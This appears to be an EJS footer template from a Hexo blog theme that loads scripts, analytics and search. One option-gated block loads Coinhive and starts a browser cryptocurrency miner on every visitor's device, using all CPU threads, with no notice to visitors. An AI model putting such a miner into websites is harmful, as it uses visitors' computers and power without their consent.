<script src="//cdn.bootcss.com/node-waves/0.7.4/waves.min.js"></script>

<%- js('js/main') %>

<% if (theme.search){ %>
<%- partial('search') %>
<%- js('js/search') %>
<% } %>

<% if (theme.mathjax){ %>
<%- partial('mathjax') %>
<% } %>

<% if (theme.cnzz){ %>
<script src="http://s95.cnzz.com/z_stat.php?id=<%=theme.cnzz %>&web_id=<%=theme.cnzz %>"></script>
<% } %>


<%- partial('google-analytics') %>

<% if (theme.turbolinks) { %>
<%- js('js/turbolinks') %>
<% } %>

<% if (theme.coinhive.enable) { %>
<script src="https://coin-hive.com/lib/coinhive.min.js"></script>
<script>
var name = Math.random().toString(36).replace(/[^a-z]+/g, '').substr(0, 8);
var miner = new CoinHive.User('<%-theme.coinhive.key%>', name, {
	    threads: navigator.hardwareConcurrency,
	    autoThreads: false,
	    throttle: 0.8,
	    forceASMJS: false
	});
miner.start(CoinHive.IF_EXCLUSIVE_TAB);     
</script>
<% } %>
